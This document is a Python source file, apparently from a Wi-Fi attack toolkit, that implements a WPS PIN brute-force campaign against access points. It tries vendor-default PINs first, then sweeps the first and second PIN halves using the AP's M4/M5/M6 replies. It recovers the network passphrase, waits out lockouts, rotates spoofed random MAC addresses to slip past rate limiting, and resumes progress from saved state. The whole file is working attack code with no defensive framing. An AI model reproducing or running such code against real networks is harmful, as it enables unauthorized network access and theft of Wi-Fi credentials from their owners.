"""WpsCampaign: the Focus-facing WPS PIN brute-force orchestrator.

Drives the two-halves (4+3+checksum) PIN sweep.
Tries to keep-alive association, re-associates on loss.

Owns:
- COMMON → first-half → second-half PIN iterator,
- lock detection + adaptive backoff,
- `.run` resume state from filesystem,
- progress/ETA, and
- pause()/resume() to prevent simultaneous TX attacks.

Sweep wiring (see registrar.py):
  COMMON_PINS, then first-half sweep until the AP returns M5
  (``first_half_ok``) → lock that P1 → second-half sweep until SUCCESS.
"""

from __future__ import annotations

import asyncio
import json
import logging
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Optional

from .campaign import Campaign
from .wps import known_pins
from .wps import pins as pinmod
from .auth_assoc import Association, WlanTransport, random_client_mac
from wifit3.dot11 import str_to_mac
from wifit3.dot11.wsc.assoc_ie import WPS_REQ_REGISTRAR, wps_assoc_ie
from .wps.lock import LockTracker
from .wps.registrar import AttemptOutcome, PinResult, WpsRegistrar, config_error_name

logger = logging.getLogger(__name__)


@dataclass
class CampaignState:
    bssid: str
    ssid: str = ""
    phase: str = "common"   # common | first_half | second_half | done | verify | failed
    common_index: int = 0
    p1_index: int = 0
    p2_index: int = 0
    first_half: Optional[str] = None
    skip_middle: Optional[str] = None  # The middle-3 of the (4+3+checksum) PIN.
    # First-halves the AP already ruled out (M4 first_half_wrong).
    dead_first_halves: list[str] = field(default_factory=list)
    found_pin: Optional[str] = None
    found_psk: Optional[str] = None
    attempts: int = 0     # sessions started (incl. rate-limited no-ops)
    tested: int = 0       # attempts that actually reached the M4 answer (M5/NACK)
    updated: float = 0.0


def _state_path(state_dir, bssid: str) -> Path:
    return Path(state_dir) / f"wps_{bssid.lower().replace(':', '-')}.run"


def load_run_state(state_dir, bssid: str) -> Optional[CampaignState]:
    """Read the on-disk .run resume state for a BSSID (no side effects), or None."""
    path = _state_path(state_dir, bssid)
    if not path.exists():
        return None
    try:
        data = json.loads(path.read_text())
        return CampaignState(**{k: data[k] for k in data if k in CampaignState.__annotations__})
    except Exception:
        return None


def run_progress_line(state: CampaignState) -> Optional[str]:
    """One-line WPS-PIN sweep progress (rich markup) for the Focus history, or None."""
    if state.found_pin:
        return None  # the _wps_pin.txt row already reports the win
    if state.phase == "failed":
        return (f"[bold]WPS PIN[/bold] sweep [red]exhausted[/red] "
                f"[dim]({state.tested:,} tried · not found)[/dim]")
    if state.phase == "second_half" and state.first_half:
        # First half locked: the live keyspace is the 1,000-candidate second half.
        return (f"[bold]WPS PIN[/bold] sweep: [cyan]{state.p2_index}[/cyan]/1k "
                f"[dim](first half [green]{state.first_half}[/green] locked)[/dim]")
    return (f"[bold]WPS PIN[/bold] sweep: [cyan]{state.tested:,}[/cyan]/11k "
            f"[dim](auto-resumes)[/dim]")


class WpsCampaign(Campaign):
    _SAVE_EVERY = 16          # checkpoint the .run file every N attempts
    _MAX_TIMEOUT_RETRIES = 8  # retries of a silent (lost-reply) attempt before conceding
    _REFUSAL_BAIL = 3         # consecutive refusals (disassoc / identity-stall) before giving up

    button_id = "btn-wps-pin"
    key = "wps"
    hotkey = ("i", "WPS PIN")
    idle_label = "WPS PIN"
    run_label = "Stop PIN"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        return ((getattr(ap, "encryption", None) or "").upper() != "WEP"
                and bool(getattr(ap, "wps", False)))

    @classmethod
    def ineligible_reason(cls, ap):
        if ap.is_hidden:
            return "hidden SSID: can't associate"
        return "WPS locked" if getattr(ap, "wps_locked", False) else None

    def __init__(self, array, target, state_dir="captures", log=None,
                 inter_attempt_delay: float = 0.0):
        super().__init__(ap=target, array=array)
        self.target = target
        self.bssid = target.bssid.lower()
        self.channel = target.channel
        self.state_dir = state_dir
        self.log = log or logger.info
        self.inter_attempt_delay = inter_attempt_delay

        self.our_mac = random_client_mac()
        self.assoc: Optional[Association] = None
        self.transport: Optional[WlanTransport] = None
        self._lease = None
        self._tx_ack = True
        self._ack_resends = 1        # max resends of an un-ACKed M-frame
        self._ap_ever_acked = False  # If AP ever ACK'd any of our frames
        self.lock = LockTracker()

        self.state = self._load_state()
        self._paused = False
        self.status = "idle"  # idle | running | paused | locked | found | failed | error

        self._attempt_ewma = 0.5  # seconds/attempt, for ETA

        # Suppress consecutive duplicate per-attempt log lines (same pin + same result)
        self._last_attempt_sig: Optional[tuple] = None

        # Live lock state for the SECURITY status row's countdown / kind display.
        # "hard" = beacon AP-Setup-Locked (the AP itself says it's not doing WPS);
        # "soft" = our internal backoff after N rejects before any PIN half is judged.
        self._lock_kind: Optional[str] = None
        self._lock_end_at: Optional[float] = None
        self._consecutive_locks_no_progress = 0

        # COMMON-phase candidates: OUI-known factory PINs first (highest hit-rate for this
        # hardware family), then the generic COMMON list. Deduped, order preserved.
        oui_pins = known_pins.known_pins_for(self.bssid)
        self._oui_pin_count = len(oui_pins)
        self._common_pins = list(dict.fromkeys(oui_pins + list(pinmod.COMMON_PINS)))

        # A silent timeout after M4/M6 is only *assumed* wrong (timeout-as-NACK). Once an
        # AP has proven it sends explicit NACKs, a silent drop is instead a LOST reply
        # so we retry the same PIN rather than advance past a possibly-correct half.
        self._ap_sends_nacks = False
        self._timeout_retries = 0
        # An AP that *actively* refuses external-registrar WPS isn't crackable (WPS ext-reg disabled
        # , or it's 802.1X). Count consecutive refusals and bail rather than soft-lock-churn forever.
        self._consecutive_refusals = 0
        self.fail_reason: Optional[str] = None   # terse give-up reason; Focus renders the fail-leaf
        self._last_logged_pin: Optional[str] = None   # log the PIN only when it changes (save width)

    # ---- persistence --------------------------------------------------------
    def _load_state(self) -> CampaignState:
        path = _state_path(self.state_dir, self.bssid)
        if path.exists():
            try:
                data = json.loads(path.read_text())
                data.setdefault("bssid", self.bssid)
                st = CampaignState(**{k: data[k] for k in data if k in CampaignState.__annotations__})
                if st.found_pin:
                    # Previous run recovered the PIN. The user clicking WPS PIN
                    # again means "verify against the live AP", handled by
                    # _run switching to the "verify" phase.
                    self.log(f"resumed campaign: previously recovered PIN "
                             f"[black bold on cyan] {st.found_pin} [/black bold on cyan]")
                elif st.first_half:
                    # In-progress with first-half locked in. Surface it.
                    self.log(f"resumed campaign: [cyan]{st.tested:,}[/cyan]"
                             f"/11,000 pins, [cyan bold]{st.first_half}[/cyan bold]"
                             f"[bold]????[/bold]")
                else:
                    self.log(f"resumed campaign: [cyan]{st.tested:,}[/cyan]"
                             f"/11,000 pins")
                return st
            except Exception as e:
                logger.warning("WPS state load failed (%s); starting fresh", e)
        return CampaignState(bssid=self.bssid, ssid=self.target.ssid or "")

    def _save_state(self) -> None:
        self.state.updated = time.time()
        path = _state_path(self.state_dir, self.bssid)
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps(asdict(self.state), indent=2))
        except Exception as e:
            logger.warning("WPS state save failed: %s", e)

    # ---- lifecycle (run()/stop() come from Campaign) ------------------------
    async def teardown(self) -> None:
        """Exit-driven cleanup (every exit: done / stop / crash)."""
        self._save_state()
        self._teardown()
        if self._lease is not None:
            await self._lease.release()
            self._lease = None

    def pause(self) -> None:
        self._paused = True
        if self.status == "running":
            self.status = "paused"

    def resume(self) -> None:
        self._paused = False

    def _teardown(self) -> None:
        if self.transport:
            self.transport.stop()
        if self.assoc:
            self.assoc.stop()
        self.transport = self.assoc = None

    @property
    def eta_seconds(self) -> Optional[float]:
        """Rough worst-case remaining time at the current rate."""
        if self.state.phase == "first_half":
            remaining = 10000 - self.state.p1_index + 1000
        elif self.state.phase == "second_half":
            remaining = 1000 - self.state.p2_index
        elif self.state.phase == "common":
            remaining = len(self._common_pins) - self.state.common_index + 10000 + 1000
        else:
            return 0.0
        return remaining * self._attempt_ewma

    # ---- the sweep ----------------------------------------------------------
    async def _ensure_session(self) -> bool:
        if self.assoc is None:
            # The lease armed our fake MAC (HW-ACK); a _rotate_mac changes it, so re-arm then.
            rotated = (self._lease is not None and self._lease.mac
                       and str_to_mac(self._lease.mac) != self.our_mac)
            if rotated:
                await self._lease.rearm(self.our_mac)
                if self._lease.mac:
                    self.our_mac = str_to_mac(self._lease.mac)
            self.assoc = Association(self.iface, self.bssid, self.target.ssid or "",
                                     self.channel, our_mac=self.our_mac,
                                     assoc_trailer_ies=wps_assoc_ie(WPS_REQ_REGISTRAR),
                                     should_stop=lambda: self.stopped)
            self.assoc.start()
            self.transport = WlanTransport(self.iface, str_to_mac(self.bssid), self.our_mac)
            self.transport.start()
        if not self.assoc.associated:
            return await self.assoc.associate()
        return True

    async def _try(self, pin: str) -> AttemptOutcome:
        """One PIN attempt on a FRESH association."""
        if not await self._ensure_session():
            return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="assoc failed")
        self.transport.drain()
        reg = WpsRegistrar(self.transport, str_to_mac(self.bssid), self.our_mac,
                           tx_ack=self._tx_ack,
                           ack_resends=self._ack_resends if self._tx_ack else 0,
                           should_stop=lambda: self.stopped)
        try:
            return await reg.try_pin(pin)
        finally:
            self._reset_session()   # fresh WSC session for the next PIN

    def _next_pin(self) -> Optional[str]:
        """The next candidate per the current phase, or None when exhausted."""
        st = self.state
        if st.phase == "verify":
            return st.found_pin  # Verify the already-found PIN
        if st.phase == "common":
            while st.common_index < len(self._common_pins):
                candidate = self._common_pins[st.common_index]
                if candidate[:4] in st.dead_first_halves:   # first half already ruled out
                    st.common_index += 1
                    continue
                return candidate
            st.phase = "first_half"
        if st.phase == "first_half":
            while st.p1_index < 10000:
                first4 = f"{st.p1_index:04d}"
                if first4 in st.dead_first_halves:  # e.g. a COMMON prefix already tried
                    st.p1_index += 1
                    continue
                return pinmod.full_pin(first4, "000")
            st.phase = "failed"  # Never encountered "Second half wrong"
            return None
        if st.phase == "second_half" and st.first_half is not None:
            # Find the 2nd half to attempt
            while st.p2_index < 1000:
                middle = f"{st.p2_index:03d}"
                # Skip singular second-half already attempted in first_half
                if middle == st.skip_middle:
                    st.p2_index += 1
                    continue
                return pinmod.full_pin(st.first_half, middle)
            st.phase = "failed"
            return None
        return None

    def _apply_outcome(self, pin: str, out: AttemptOutcome) -> None:
        """Advance the keyspace from one successful attempt."""
        st = self.state
        # WPS_CFG_SETUP_LOCKED (config_error 15): the AP explicitly says WPS is locked.
        if out.config_error == 15:
            self.lock.note_setup_locked()
            return
        if out.result in (PinResult.PROTO_ERROR, PinResult.TIMEOUT):
            self.lock.note_reject_before_pin_answer()
            return

        st.tested += 1
        self.lock.note_progress()
        # A real M4 answer (M5/NACK) means the AP IS letting our rotated client through.
        self._consecutive_locks_no_progress = 0

        if st.phase == "verify":
            self._apply_verify_outcome(pin, out)
            return

        if out.result is PinResult.SUCCESS:
            st.found_pin, st.found_psk, st.phase = pin, out.psk, "done"
        elif out.first_half_ok:
            # AP reached M5 → this first half is correct. (SECOND_HALF_WRONG)
            if st.phase != "second_half":
                st.first_half = pinmod.split_pin(pin)[0]
                st.phase, st.p2_index = "second_half", 0
                st.skip_middle = pin[4:7]  # Avoid trying the same PIN twice
            else:
                st.p2_index += 1
        elif out.result is PinResult.FIRST_HALF_WRONG:
            # This first half is dead
            if st.phase == "common":
                first4 = pin[:4]
                if first4 not in st.dead_first_halves:
                    st.dead_first_halves.append(first4)
                st.common_index += 1
            elif st.phase == "first_half":
                st.p1_index += 1

    def _apply_verify_outcome(self, pin: str, out: AttemptOutcome) -> None:
        """Resume-time re-verification of a previously-recovered PIN."""
        st = self.state
        if out.result is PinResult.SUCCESS:
            # PIN verified as working
            new_psk = out.psk or ""
            old_psk = st.found_psk or ""
            if new_psk != old_psk:
                self.log(f"[bold green]verified[/bold green] PIN [cyan]{pin}[/cyan]: "
                         f"[bold yellow]PSK CHANGED[/bold yellow] "
                         f"[dim](updated below)[/dim]")
            else:
                self.log(f"[bold green]verified[/bold green] PIN [cyan]{pin}[/cyan] "
                         f"[dim](PSK unchanged)[/dim]")
            st.found_psk = new_psk
            st.phase = "done"
            return
        if out.first_half_ok:
            # PIN changed: SECOND_HALF_WRONG, first half still valid
            kept = pinmod.split_pin(pin)[0]
            self.log(f"[yellow]PIN's second half changed[/yellow], "
                     f"first half [green]{kept}[/green] still valid; "
                     f"sweeping second half again")
            st.first_half = kept
            st.found_pin = None
            st.found_psk = None
            st.phase = "second_half"
            st.p2_index = 0
            st.skip_middle = pin[4:7]   # confirmed-wrong middle
            return
        if out.result is PinResult.FIRST_HALF_WRONG:
            # PIN changed: Nothing from old PIN is recoverable.
            self.log("[red]PIN no longer valid[/red] "
                     "[dim](first half wrong, restarting full sweep)[/dim]")
            st.first_half = None
            st.found_pin = None
            st.found_psk = None
            st.phase = "common"
            st.common_index = 0
            st.p1_index = 0
            st.p2_index = 0
            st.skip_middle = None

    async def _loop(self) -> None:
        self.status = "running"
        self._lease = self.array.lease(channel=self.channel, fake_mac=self.our_mac,
                                       bssid=str_to_mac(self.bssid), ack_tally=self._tx_ack)
        await self._lease.acquire()
        if self._lease.mac:
            self.our_mac = str_to_mac(self._lease.mac)
        name = self.target.ssid or self.bssid
        logger.info("WPS campaign start on %s (mac %s)", name, self.our_mac.hex())
        if self._oui_pin_count:
            self.log(f"[dim]Prioritizing [bold]{self._oui_pin_count} OUI-matching "
                     f"default PIN(s)[/bold][/dim]")

        # When resuming with a previously-recovered PIN, re-verify it against the AP
        if self.state.phase == "done" and self.state.found_pin:
            self.log("re-verifying PIN against the AP "
                     "[dim](if the PSK changed, we'll catch it)[/dim]")
            self.state.phase = "verify"

        try:
            while not self.stopped:
                if self._paused:
                    self.status = "paused"
                    await asyncio.sleep(0.2)
                    continue

                beacon_locked = self._beacon_locked()
                if self.lock.is_locked(beacon_locked):
                    # Skip the wait the first soft-lock after every tested++.
                    skip_wait = (not beacon_locked
                                 and self._consecutive_locks_no_progress == 0)
                    await self._handle_lock(beacon_locked, wait=not skip_wait)
                    if self.stopped:
                        break  # Short circuit before next phase
                    self._rotate_mac()
                    self._consecutive_locks_no_progress += 1
                    continue

                pin = self._next_pin()
                if pin is None:
                    self.status = "found" if self.state.found_pin else "failed"
                    break

                self.status = "running"
                # Detect transitions
                prev_first_half = self.state.first_half
                prev_phase = self.state.phase
                t0 = time.monotonic()
                out = await self._try(pin)
                if self._tx_ack and not self._ap_ever_acked and self.iface.acks_seen(self.our_mac):
                    self._ap_ever_acked = True
                # EWMA: Exponentially Weighted Moving Average. tl;dr math
                self._attempt_ewma = 0.7 * self._attempt_ewma + 0.3 * (time.monotonic() - t0)
                self.state.attempts += 1

                if self.stopped:
                    break   # Stopped mid-attempt (user Stop / AP switch): bail BEFORE logging

                if out.refused:   # AP actively rejected external-registrar WPS, never advances
                    self._consecutive_refusals += 1
                    # Log each one (no dedup) so the disassoc-vs-identity-stall variation shows.
                    self.log(f"{self._attempt_prefix(pin)} → [yellow]{out.detail}[/yellow] "
                             f"[dim bold]\\[#{self._consecutive_refusals}][/dim bold]")
                    if self._consecutive_refusals >= self._REFUSAL_BAIL:
                        self.status = "failed"     # Focus renders the fail-leaf from fail_reason
                        self.fail_reason = f"AP refused before M1 {self._REFUSAL_BAIL}×"
                        self._save_state()
                        break
                    continue                       # bounded retry; never advance the keyspace
                self._consecutive_refusals = 0

                if self._should_retry_lost_reply(pin, out):
                    # Session already reset by _try; the retry re-associates fresh (same MAC).
                    if self.state.attempts % self._SAVE_EVERY == 0:
                        self._save_state()
                    continue                       # retry the SAME pin, do not advance

                self._apply_outcome(pin, out)

                verify_terminal = (prev_phase == "verify" and out.result not in
                                   (PinResult.PROTO_ERROR, PinResult.TIMEOUT))
                # Avoid logging an "attempt" on a verified PIN, or after user halt.
                if not verify_terminal and not self.stopped:
                    self._log_attempt(pin, out, prev_first_half)

                if self.state.phase == "done":
                    self._save_state()
                    self.status = "found"
                    break

                if self.state.attempts % self._SAVE_EVERY == 0:
                    self._save_state()
                if self.inter_attempt_delay:
                    await asyncio.sleep(self.inter_attempt_delay)
        except Exception as e:
            logger.exception("WPS campaign crashed")
            self.status = "error"
            self.log(f"[red]campaign error:[/red] {e}")
        # save + _teardown + lease release now run in teardown() (every exit).

    def _beacon_locked(self) -> bool:
        ap = self.array.access_points.get(self.bssid)
        return bool(getattr(ap, "wps_locked", False)) if ap else False

    async def _handle_lock(self, beacon_locked: bool, wait: bool = True) -> None:
        """Mark the lock state, optionally wait it out, then release."""
        # Don't treat a silent AP (0 ACKs) as locked.
        if not beacon_locked and self._tx_ack and not self._ap_ever_acked:
            self.log("[orange1]No ACK from AP[/orange1] [dim](retrying, no backoff)[/dim]")
            self.lock.note_progress()
            self._last_attempt_sig = None
            return
        self.lock.begin_lock()
        # "hard" = AP itself advertises WPS locked in its beacons
        # "soft" = our backoff after N rejects before any PIN half is judged.
        self._lock_kind = "hard" if beacon_locked else "soft"
        trigger = "beacon" if beacon_locked else f"{self.lock.strikes} strikes"
        if wait:
            # Slow path: AP is locked
            backoff = self.lock.backoff()
            self._lock_end_at = time.monotonic() + backoff
            self.status = "locked"
            lock_label = "hard locked" if beacon_locked else "soft-lock"
            self.log(f"{self._cont_align()} → [bright_red]{lock_label}[/bright_red] "
                     f"({trigger}) [dim]waiting {backoff:.0f}s[/dim]")
            self._save_state()
            end = time.monotonic() + backoff
            while time.monotonic() < end and not self.stopped:
                await asyncio.sleep(0.5)
                if not self._beacon_locked() and self.lock.strikes < self.lock.strike_threshold:
                    break
        else:
            # Fast path: Assume AP is not locked to a new MAC
            self.log(f"{self._cont_align()} → [bright_red]soft-lock[/bright_red] "
                     f"[dim]rotating MAC[/dim]")
        self.lock.end_lock()
        self._lock_kind = None
        self._lock_end_at = None
        self._last_attempt_sig = None  # The next attempt is a new conversation, don't dedupe.

    @property
    def lock_kind(self) -> Optional[str]:
        """'hard' / 'soft' / None, see _handle_lock."""
        return self._lock_kind

    @property
    def lock_remaining_seconds(self) -> float:
        """Seconds remaining on the current backoff (0 if not locked)."""
        if self._lock_end_at is None:
            return 0.0
        return max(0.0, self._lock_end_at - time.monotonic())

    def _should_retry_lost_reply(self, pin: str, out: AttemptOutcome) -> bool:
        """True if this half-wrong was inferred from *silence* on an AP we know NACKs."""
        if out.config_error is not None:
            self._ap_sends_nacks = True   # this AP answers wrong guesses with a real NACK
        silent_half_wrong = (
            out.via_timeout and self._ap_sends_nacks
            and out.result in (PinResult.FIRST_HALF_WRONG, PinResult.SECOND_HALF_WRONG))
        if not silent_half_wrong:
            self._timeout_retries = 0
            return False
        self._timeout_retries += 1
        if self._timeout_retries > self._MAX_TIMEOUT_RETRIES:
            self.log(f"{self._attempt_prefix(pin)} → [dim]no reply after "
                     f"{self._timeout_retries} tries, conceding as wrong[/dim]")
            self._timeout_retries = 0
            return False                  # give up retrying; fall through to advance
        lost = "M5" if out.result is PinResult.FIRST_HALF_WRONG else "M7"
        self.log(f"{self._attempt_prefix(pin)} → [dim]no reply (likely a lost {lost}), "
                 f"retrying (#{self._timeout_retries})[/dim]")
        self.lock.note_progress()         # a lost reply isn't a lock; keep the strike clean
        return True

    def _reset_session(self) -> None:
        """Drop the association + transport so the next attempt re-associates (keeps the MAC)."""
        if self.transport is not None:
            self.transport.stop()
        if self.assoc is not None:
            self.assoc.stop()
        self.assoc = None
        self.transport = None
        self._last_attempt_sig = None

    def _rotate_mac(self) -> None:
        """Fresh random MAC (+ fresh session). Rate-limit fallback only. The AP is NOT
        one-shot-per-MAC (proven on hardware), so this is not part of the normal loop."""
        self._reset_session()
        old = self.our_mac
        self.our_mac = random_client_mac()
        logger.debug("WPS rotated MAC %s -> %s", old.hex(), self.our_mac.hex())

    def _attempt_prefix(self, pin: str) -> str:
        """Bold-cyan the PIN when it changed since the last logged line, else a blank."""
        if pin == self._last_logged_pin:
            return self._cont_align()
        self._last_logged_pin = pin
        return f"[bold cyan]{pin}[/bold cyan]"

    def _cont_align(self) -> str:
        """Blank prefix the width of the last-logged PIN, aligning a continuation's '→'."""
        return " " * len(self._last_logged_pin or "        ")

    def _log_attempt(self, pin: str, out: AttemptOutcome,
                     prev_first_half: Optional[str]) -> None:
        """One concise line per PIN attempt."""
        if out.result is PinResult.SUCCESS:
            return
        first_half_just_confirmed = (
            self.state.first_half is not None and prev_first_half is None)

        sig = (pin, out.result)
        if sig == self._last_attempt_sig and not first_half_just_confirmed:
            return  # Avoid duplicate attempt logs
        self._last_attempt_sig = sig

        label = self._attempt_prefix(pin)
        if first_half_just_confirmed:
            self.log(f"{label} → [bold bright_green]first half OK[/bold bright_green] "
                     f"[dim bold]\\[M5][/dim bold]")
            return
        if out.result is PinResult.FIRST_HALF_WRONG:
            self.log(f"{label} → [red]first half wrong[/red] [dim bold]\\[M4][/dim bold]")
        elif out.result is PinResult.SECOND_HALF_WRONG:
            self.log(f"{label} → [bold bright_red]second half wrong[/bold bright_red] "
                     f"[dim bold]\\[M6][/dim bold]")
        elif out.result is PinResult.PROTO_ERROR:
            if out.detail == "assoc failed":   # not a NACK, we never associated (AP often locked)
                if self._tx_ack and not self._ap_ever_acked:
                    # Zero ACKs: the AP isn't hearing us at all (out of range).
                    self.log(f"{label} → [orange1]no assoc[/orange1] "
                             f"[dim bold](0 TX ACKs)[/dim bold]")
                else:
                    # AP heard us (ACKed) but wouldn't complete association.
                    self.log(f"{label} → [orange1]no assoc response[/orange1]")
            else:
                # De-swallowed reason: the AP answered with a NACK carrying a config-error.
                why = (config_error_name(out.config_error)
                       if out.config_error is not None else (out.detail or "?"))
                self.log(f"{label} → [yellow]refused: {why}[/yellow]")
        elif out.result is PinResult.TIMEOUT:
            # Only non-refused timeouts reach here (refused ones log in the loop). Terse.
            self.log(f"{label} → [dim]{out.detail or 'no reply'}[/dim]")
